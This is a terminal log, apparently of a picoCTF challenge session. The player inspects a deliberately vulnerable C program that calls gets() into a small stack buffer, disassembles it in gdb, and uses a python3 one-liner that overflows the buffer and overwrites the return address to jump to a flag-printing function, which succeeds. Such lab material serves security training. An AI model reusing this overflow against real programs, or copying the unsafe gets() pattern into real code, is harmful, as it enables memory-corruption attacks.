@@ -1,0 +1,259 @@
+ctf-player@pico-chall$ ls
+CodeBank  instructions.txt  start
+ctf-player@pico-chall$ cat instructions.txt 
+Hint:
+
+- Run ./start to get a binary from the Code Bank
+- You will get a C source file and a binary.
+- Once the files are generated, you will have 120 seconds to exploit the binary.
+- If the binary is exploited within the time limit, you will get the flag. Otherwise, the process has to be restarted.
+
+ctf-player@pico-chall$ ./start 
+[+] Selected file: 8.c
+[+] Copied 8.c to current directory.
+[+] Compilation successful: 8
+[+] Binary 8 has access to flag.txt
+[*] Deletion scheduled: files will be removed in 120 seconds (even if this script exits).
+ctf-player@pico-chall$ ls
+8  8.c  CodeBank  instructions.txt  start
+ctf-player@pico-chall$ cat 8.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "CodeBank/asm.h"
+
+#define BUFSIZE 50
+#define FLAGSIZE 64
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("CodeBank/flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "You may not have plenty of time",
+                    "to solve the challenge.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+ctf-player@pico-chall$ ./8
+-bash: ./8: No such file or directory
+ctf-player@pico-chall$ ls
+CodeBank  instructions.txt  start
+ctf-player@pico-chall$ ./start 
+[+] Selected file: 3.c
+[+] Copied 3.c to current directory.
+[+] Compilation successful: 3
+[+] Binary 3 has access to flag.txt
+[*] Deletion scheduled: files will be removed in 120 seconds (even if this script exits).
+ctf-player@pico-chall$ cat 3.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "CodeBank/asm.h"
+
+#define BUFSIZE 44
+#define FLAGSIZE 64
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("CodeBank/flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "You may not have plenty of time",
+                    "to solve the challenge.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+ctf-player@pico-chall$ ./3
+Please enter your string: 
+%p
+Okay, time to return... Fingers Crossed... Jumping to 0x804932f
+ctf-player@pico-chall$ gdb 3
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.2) 9.2
+Copyright (C) 2020 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+--Type <RET> for more, q to quit, c to continue without paging--c
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from 3...
+(No debugging symbols found in 3)
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080492c4 <+0>:     endbr32 
+   0x080492c8 <+4>:     lea    0x4(%esp),%ecx
+   0x080492cc <+8>:     and    $0xfffffff0,%esp
+   0x080492cf <+11>:    pushl  -0x4(%ecx)
+   0x080492d2 <+14>:    push   %ebp
+   0x080492d3 <+15>:    mov    %esp,%ebp
+   0x080492d5 <+17>:    push   %ebx
+   0x080492d6 <+18>:    push   %ecx
+   0x080492d7 <+19>:    sub    $0x10,%esp
+   0x080492da <+22>:    call   0x8049130 <__x86.get_pc_thunk.bx>
+   0x080492df <+27>:    add    $0x2d21,%ebx
+   0x080492e5 <+33>:    mov    -0x4(%ebx),%eax
+   0x080492eb <+39>:    mov    (%eax),%eax
+   0x080492ed <+41>:    push   $0x0
+   0x080492ef <+43>:    push   $0x2
+   0x080492f1 <+45>:    push   $0x0
+   0x080492f3 <+47>:    push   %eax
+   0x080492f4 <+48>:    call   0x80490b0 <setvbuf@plt>
+   0x080492f9 <+53>:    add    $0x10,%esp
+   0x080492fc <+56>:    call   0x8049070 <getegid@plt>
+   0x08049301 <+61>:    mov    %eax,-0xc(%ebp)
+   0x08049304 <+64>:    sub    $0x4,%esp
+   0x08049307 <+67>:    pushl  -0xc(%ebp)
+   0x0804930a <+70>:    pushl  -0xc(%ebp)
+   0x0804930d <+73>:    pushl  -0xc(%ebp)
+   0x08049310 <+76>:    call   0x80490d0 <setresgid@plt>
+   0x08049315 <+81>:    add    $0x10,%esp
+   0x08049318 <+84>:    sub    $0xc,%esp
+   0x0804931b <+87>:    lea    -0x1f64(%ebx),%eax
+   0x08049321 <+93>:    push   %eax
+   0x08049322 <+94>:    call   0x8049080 <puts@plt>
+   0x08049327 <+99>:    add    $0x10,%esp
+   0x0804932a <+102>:   call   0x8049281 <vuln>
+   0x0804932f <+107>:   mov    $0x0,%eax
+   0x08049334 <+112>:   lea    -0x8(%ebp),%esp
+   0x08049337 <+115>:   pop    %ecx
+   0x08049338 <+116>:   pop    %ebx
+   0x08049339 <+117>:   pop    %ebp
+   0x0804933a <+118>:   lea    -0x4(%ecx),%esp
+   0x0804933d <+121>:   ret    
+End of assembler dump.
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x08049281 <+0>:     endbr32 
+   0x08049285 <+4>:     push   %ebp
+   0x08049286 <+5>:     mov    %esp,%ebp
+   0x08049288 <+7>:     push   %ebx
+   0x08049289 <+8>:     sub    $0x34,%esp
+   0x0804928c <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
+   0x08049291 <+16>:    add    $0x2d6f,%ebx
+   0x08049297 <+22>:    sub    $0xc,%esp
+   0x0804929a <+25>:    lea    -0x34(%ebp),%eax
+   0x0804929d <+28>:    push   %eax
+   0x0804929e <+29>:    call   0x8049050 <gets@plt>
+   0x080492a3 <+34>:    add    $0x10,%esp
+   0x080492a6 <+37>:    call   0x804933e <get_return_address>
+   0x080492ab <+42>:    sub    $0x8,%esp
+   0x080492ae <+45>:    push   %eax
+   0x080492af <+46>:    lea    -0x1fa0(%ebx),%eax
+   0x080492b5 <+52>:    push   %eax
+   0x080492b6 <+53>:    call   0x8049040 <printf@plt>
+   0x080492bb <+58>:    add    $0x10,%esp
+   0x080492be <+61>:    nop
+   0x080492bf <+62>:    mov    -0x4(%ebp),%ebx
+   0x080492c2 <+65>:    leave  
+   0x080492c3 <+66>:    ret    
+End of assembler dump.
+(gdb) disas win
+Dump of assembler code for function win:
+   0x080491f6 <+0>:     endbr32 
+   0x080491fa <+4>:     push   %ebp
+   0x080491fb <+5>:     mov    %esp,%ebp
+   0x080491fd <+7>:     push   %ebx
+   0x080491fe <+8>:     sub    $0x54,%esp
+   0x08049201 <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
+   0x08049206 <+16>:    add    $0x2dfa,%ebx
+   0x0804920c <+22>:    sub    $0x8,%esp
+   0x0804920f <+25>:    lea    -0x1ff8(%ebx),%eax
+   0x08049215 <+31>:    push   %eax
+   0x08049216 <+32>:    lea    -0x1ff6(%ebx),%eax
+   0x0804921c <+38>:    push   %eax
+   0x0804921d <+39>:    call   0x80490c0 <fopen@plt>
+   0x08049222 <+44>:    add    $0x10,%esp
+   0x08049225 <+47>:    mov    %eax,-0xc(%ebp)
+   0x08049228 <+50>:    cmpl   $0x0,-0xc(%ebp)
+   0x0804922c <+54>:    jne    0x8049258 <win+98>
+   0x0804922e <+56>:    sub    $0x4,%esp
+   0x08049231 <+59>:    lea    -0x1fe4(%ebx),%eax
+   0x08049237 <+65>:    push   %eax
+   0x08049238 <+66>:    lea    -0x1fc8(%ebx),%eax
+   0x0804923e <+72>:    push   %eax
+   0x0804923f <+73>:    lea    -0x1fa8(%ebx),%eax
+   0x08049245 <+79>:    push   %eax
+   0x08049246 <+80>:    call   0x8049040 <printf@plt>
+   0x0804924b <+85>:    add    $0x10,%esp
+   0x0804924e <+88>:    sub    $0xc,%esp
+   0x08049251 <+91>:    push   $0x0
+   0x08049253 <+93>:    call   0x8049090 <exit@plt>
+   0x08049258 <+98>:    sub    $0x4,%esp
+   0x0804925b <+101>:   pushl  -0xc(%ebp)
+   0x0804925e <+104>:   push   $0x40
+   0x08049260 <+106>:   lea    -0x4c(%ebp),%eax
+   0x08049263 <+109>:   push   %eax
+   0x08049264 <+110>:   call   0x8049060 <fgets@plt>
+   0x08049269 <+115>:   add    $0x10,%esp
+   0x0804926c <+118>:   sub    $0xc,%esp
+   0x0804926f <+121>:   lea    -0x4c(%ebp),%eax
+   0x08049272 <+124>:   push   %eax
+   0x08049273 <+125>:   call   0x8049040 <printf@plt>
+   0x08049278 <+130>:   add    $0x10,%esp
+   0x0804927b <+133>:   nop
+   0x0804927c <+134>:   mov    -0x4(%ebp),%ebx
+   0x0804927f <+137>:   leave  
+   0x08049280 <+138>:   ret    
+End of assembler dump.
+(gdb) quit
+ctf-player@pico-chall$ python3 -c "import sys; sys.stdout.buffer.write(b'A' * 56 + b'\xf6\x91\x04\x08' + b'\n')" | ./3
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{u_Us3d_pwNt00L5_a258f222}Segmentation fault (core dumped)
+ctf-player@pico-chall$ Connection to green-hill.picoctf.net closed by remote host.
+Connection to green-hill.picoctf.net closed.
